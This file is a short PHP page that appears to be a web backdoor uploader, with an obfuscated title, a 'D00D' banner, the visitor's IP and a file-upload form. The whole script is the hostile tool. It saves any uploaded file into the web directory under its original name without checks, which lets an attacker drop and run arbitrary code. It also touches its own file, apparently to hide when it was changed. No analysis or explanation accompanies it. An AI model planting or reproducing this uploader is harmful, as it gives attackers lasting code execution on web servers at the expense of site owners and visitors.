<html>
<head><meta http-equiv="Content-Type" content="text/html; charset=windows-utf-8"><title>O45DCEVWE6F</title></head> 
<body>
<?php
print '<h1>#p@$c@#</h1>';
echo "D00D: ";   
echo $_SERVER['REMOTE_ADDR'];
echo "<form method=\"post\" enctype=\"multipart/form-data\">\n";
echo "<input type=\"submit\" value=\"LOAD\"><br>\n";
echo "<input type=\"file\" name=\"filename\"><br> \n";
echo "</form>\n";  

if ( @is_uploaded_file( $_FILES["filename"]["tmp_name"] ))
{
	  
	move_uploaded_file($_FILES["filename"]["tmp_name"], /*_*/  $_FILES["filename"]["name"]);
	  
	$file = $_FILES["filename"]["name"]; /*_*/
	echo "<a href=\"$file\">$file</a>";
	 
}
else
{
	  
	echo("empty");
	/*_*/
}
/*_*/
$var1 = $_SERVER['SCRIPT_FILENAME'];
  
touch( $var1 );
?>
</body>
</html> 
